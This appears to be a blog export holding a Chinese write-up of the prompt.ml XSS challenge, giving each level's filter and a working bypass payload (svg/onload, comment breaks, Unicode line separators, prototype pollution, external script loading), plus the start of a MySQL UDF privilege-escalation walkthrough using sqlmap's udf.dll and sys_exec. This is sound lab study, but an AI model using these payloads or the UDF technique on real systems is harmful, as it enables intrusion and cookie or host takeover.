    <content><![CDATA[<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KPz0bR.png" alt="KPz0bR.png"></p>
<p>闭合就完事了。&lt;svg/onload=alert(1)&gt;</p>
<p>IE10</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onresize&#x3D;prompt(1) &quot;</span><br></pre></td></tr></table></figure>

<p>IE10下，第一次加载页面时，会调用resize函数</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KiHezR.png" alt="KiHezR.png"></p>
<p>通过正则吃掉完整的标签，所以我们需要不通过完整标签就能xss的标签</p>
<p>也就是不能用闭合标签了，需要找一些自闭和标签进行xss</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;body onload&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p>以上三种都可以进行xss</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(/[=(]/g, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤符号如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[,],&#x3D;,(</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KiP89P.png" alt="KiP89P.png"></p>
<p>很有趣的XSS bypass</p>
<p><a href="https://blog.csdn.net/weixin_30408165/article/details/99649981" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30408165/article/details/99649981</a></p>
<p>首先`字符是可以把包裹住的字符串当成字符，同时把unicode转化为正常字符，即可成功alert。</p>
<p>setTimeout函数</p>
<p><img src="https://s2.ax1x.com/2019/10/16/Kin3ZV.png" alt="Kin3ZV.png"></p>
<p>看网上的其他wp大都是通过&lt;svg&gt;去解析html编码，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;&#x2F;script&gt;</span><br><span class="line">&#x2F;&#x2F;另一种payload</span><br><span class="line">&lt;script&gt;eval.call&#96;$&#123;&#39;prompt\x281)&#39;&#125;&#96;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(/-&gt;/g, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>html5的注释标签不仅可以使用<code>--&gt;</code>，还可以使用<code>--!&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--!&gt;&lt;svg&#x2F;onload&#x3D;prompt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (/^(?:https?:)?\/\/prompt\.ml\<span class="comment">//i.test(decodeURIComponent(input))) &#123;</span></span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;prompt.ml%2f@Your_vps</span><br></pre></td></tr></table></figure>

<p>利用知识为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1@www.baidu.com&#x2F;</span><br></pre></td></tr></table></figure>

<p>实际上访问的是<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
<p>不过这道题匹配的是<a href="http://prompt.ml/，后面的这个/很麻烦，我们如果用http://127.0.0.1/@www.baidu.com/是无法访问到百度的，这个/必须要去掉，这里decode函数帮了我们这个忙，通过" target="_blank" rel="noopener">http://prompt.ml/，后面的这个/很麻烦，我们如果用http://127.0.0.1/@www.baidu.com/是无法访问到百度的，这个/必须要去掉，这里decode函数帮了我们这个忙，通过</a></p>
<p><a href="http://prompt.ml%2f@Your_vps" target="_blank" rel="noopener">http://prompt.ml%2f@Your_vps</a> 既可以bypass正则，又可以规避掉/这个字符。</p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFrcPU.png" alt="KFrcPU.png"></p>
<p>这题过滤掉了onfocus，Onxxx=之类的形式，对于onxxx=的bypass我们可以使用换行来Bypass,因为属性描述不在同一行并不影响解析，如果没过滤onfocus，我们可以通过如下payload绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus&#x3D;javascript:alert(1) autofocus&gt; </span><br><span class="line">&lt;input onblur&#x3D;javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了情况下可以通过覆盖type，进行onerror触发xss</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;&quot;image&quot; src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p>即可触发xss</p>
<p>看大佬的博客学到了在IE下可以通过onresize触发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onresize</span><br><span class="line">&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = JSON.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = document.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i in formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(document.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑就是自动通过传进去参数填写表单，并且submit，不过在submit前需要对action属性进行一下检测</p>
<p>这个trick挺有意思的，我之前没看到过。</p>
<p>这里在action的地方可以通过javascript伪协议来触发xss，但是这里有一个对action标签的检测，不过这里允许我们自己添加，我们在后面添加一个action就可以bypass这个正则了</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFgJ1O.png" alt="KFgJ1O.png"></p>
<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限定了12个字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;      &#x2F;* *&#x2F;     &lt;!-- --&gt;    &lt;!-- --!&gt;</span><br></pre></td></tr></table></figure>

<p>一般用于Bypass和过滤的注释符</p>
<p>还行，挺简单的bypass,用js的注释符多行注释一下就行</p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#x2F;*#*&#x2F;prompt(&#x2F;*#*&#x2F;1)&#x2F;*#*&#x2F;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学到了，原来在Js中不光有\r\n这种换行符，还有神奇的unicode字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u2028prompt(1)\u2028--&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFT92R.png" alt="KFT92R.png"></p>
<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看过code-breaking的nodechr，也就会了，不过还要注意的是js对大小写是敏感的，所以必须引入外部js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">"http://xxxtest.js"</span>&gt;&lt;<span class="regexp">/ſcript&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题出的就很没意思了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">prom&#39;pt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"(prompt(1))instanceof"</span></span><br></pre></td></tr></table></figure>

<p>一张图看懂，即使报错，也能xss</p>
<p><img src="https://s2.ax1x.com/2019/10/17/KEhYaF.png" alt="KEhYaF.png"></p>
<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本来想着用fromCharCode来着，后面发现逗号被url编码了，所以可以用下面的这个数字转换进行来代替</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval((630038579).toString(30))(1)</span><br></pre></td></tr></table></figure>

<p>另一种比较有意思的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for((i)in(self))eval(i)(1)</span><br></pre></td></tr></table></figure>

<p>通过循环拿到self里面的函数，来进行prompt</p>
<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>典型的原型链污染，不过后面的正则操作有丶意思，之前没了解过</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;source&quot;:&#123;&#125;,&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$&#96;onerror&#x3D;prompt(1)&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如下</p>
<p>直接粘了先知例子了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"test"</span>)</span><br><span class="line"><span class="string">"11test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$`test"</span>)</span><br><span class="line"><span class="string">"1111test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$'test"</span>)</span><br><span class="line"><span class="string">"1123344test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$&amp;test"</span>)</span><br><span class="line"><span class="string">"112test23344"</span></span><br></pre></td></tr></table></figure>

<p>从上面例子易得此payload</p>
<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;IFRAME&#x2F;SRC&#x3D;&quot;x:text&#x2F;html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJP</span><br></pre></td></tr></table></figure>

<p>官方payload，不过测试失败。</p>
<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(/\*/g, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title, index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>svg xss 学到了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>由于这里用的是Html的注释，所以必须加个svg标签</p>
<p>svg配合实体编码bypass也是很常用的操作</p>
<h3 id="一些常用的Payload"><a href="#一些常用的Payload" class="headerlink" title="一些常用的Payload"></a>一些常用的Payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus&#x3D;javascript:alert(1) autofocus&gt; </span><br><span class="line"></span><br><span class="line">&lt;input onblur&#x3D;javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea onfocus&#x3D;javascript:alert(1) autofocus&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p>
<p><a href="https://xz.aliyun.com/t/4507#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/4507#toc-4</a></p>
<p><a href="https://wooyun.js.org/drops/xss挑战赛writeup.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html</a></p>
<p><a href="http://momomoxiaoxi.com/2017/10/10/XSS/" target="_blank" rel="noopener">http://momomoxiaoxi.com/2017/10/10/XSS/</a></p>
]]></content>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>udf提权复现</title>
    <url>/2019/06/01/udf%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/</li>
<li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</li>
<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li>
<li>拥有可以将udf.dll写入相应目录的权限。</li>
</ul>
<p>这里我用的是phpstudy上的mysql作为对象，udt提权所需的文件在sqlmap上是有的，因为sqlmap也能udf提权，大多数mysql是32位的，udf.dll所用的是异或编码，使用前需要进行解码<code>cloak.py</code>,解码完毕后会在当前目录生成你所需的文件</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2roegm93qj31b20kk42f.jpg" alt=""></p>
<p>成功生成所需提权文件，然后将文件放到Mysql下<code>lib/plugin</code>目录下，在mysql执行创建函数命令，</p>
<p>命令格式为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function you_want returns string soname &quot;lib_mysqludf_dll&quot;;</span><br></pre></td></tr></table></figure>

<p>例如我可以通过创建sys_exec命令执行函数</p>
